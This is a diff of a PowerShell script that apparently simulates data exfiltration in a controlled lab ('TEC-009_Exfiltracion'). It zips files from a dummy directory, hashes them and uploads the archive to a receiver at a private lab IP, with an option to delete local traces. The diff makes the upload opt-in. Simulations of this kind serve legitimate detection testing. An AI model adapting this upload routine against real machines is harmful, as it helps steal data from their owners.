@@ -9,21 +9,26 @@ param(
     [string]$OutputDir = "",
 
     [string]$ReceiverUrl = "http://192.168.56.1:8000/upload",
-    [bool]$EnableUpload = $true,
+    [switch]$EnableUpload,
     [int]$TimeoutSec = 30,
     [string]$ZipName = "tec009_controlled_archive.zip",
-    [bool]$KeepArtifacts = $true
+    [switch]$KeepArtifacts
 )
 
 Set-StrictMode -Version Latest
 $ErrorActionPreference = "Stop"
 
-$ProjectRoot = Split-Path -Parent $PSScriptRoot
+$BasePath = $env:TFM_BASEPATH
+if ([string]::IsNullOrWhiteSpace($BasePath)) {
+    $BasePath = "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas"
+}
+$env:TFM_BASEPATH = $BasePath
+
 if ([string]::IsNullOrWhiteSpace($WorkDir)) {
-    $WorkDir = Join-Path $ProjectRoot "DUMB_LAB"
+    $WorkDir = Join-Path $BasePath "DUMB_LAB"
 }
 if ([string]::IsNullOrWhiteSpace($OutputDir)) {
-    $OutputDir = Join-Path $ProjectRoot "Pruebas\TEC-009_Exfiltracion\staging_controlled"
+    $OutputDir = Join-Path $BasePath "TEC-009_Exfiltracion\staging_controlled"
 }
 if (-not $ZipName.ToLowerInvariant().EndsWith(".zip")) {
     $ZipName = "$ZipName.zip"
@@ -56,7 +61,7 @@ $uploadSucceeded = $false
 $uploadError = ""
 $receiverResponse = ""
 
-if ($EnableUpload) {
+if ($EnableUpload.IsPresent) {
     try {
         $response = Invoke-WebRequest `
             -Uri $ReceiverUrl `
@@ -90,13 +95,13 @@ $summary = [ordered]@{
     CopyBytes = $copyItem.Length
     LocalSHA256 = $localHash
     ReceiverUrl = $ReceiverUrl
-    EnableUpload = $EnableUpload
+    EnableUpload = [bool]$EnableUpload
     TimeoutSec = $TimeoutSec
     HttpStatusCode = $httpStatusCode
     UploadSucceeded = $uploadSucceeded
     UploadError = $uploadError
     ReceiverResponse = $receiverResponse
-    KeepArtifacts = $KeepArtifacts
+    KeepArtifacts = [bool]$KeepArtifacts
 }
 
 $summary | ConvertTo-Json -Depth 5 | Set-Content -LiteralPath $summaryFile -Encoding UTF8
@@ -107,17 +112,17 @@ Write-Host "ZIP copy created: $copyFile"
 Write-Host "ZIP bytes: $($zipItem.Length)"
 Write-Host "ZIP SHA256: $localHash"
 Write-Host "Receiver URL: $ReceiverUrl"
-Write-Host "Upload enabled: $EnableUpload"
+Write-Host "Upload enabled: $([bool]$EnableUpload)"
 Write-Host "HTTP status: $httpStatusCode"
 Write-Host "Upload succeeded: $uploadSucceeded"
 Write-Host "Summary: $summaryFile"
 
-if (-not $KeepArtifacts) {
+if (-not $KeepArtifacts.IsPresent) {
     Remove-Item -LiteralPath $zipFile -Force -ErrorAction SilentlyContinue
     Remove-Item -LiteralPath $copyFile -Force -ErrorAction SilentlyContinue
     Write-Host "Local ZIP artifacts removed because KeepArtifacts=false."
 }
 
-if ($EnableUpload -and -not $uploadSucceeded) {
+if ($EnableUpload.IsPresent -and -not $uploadSucceeded) {
     exit 2
 }
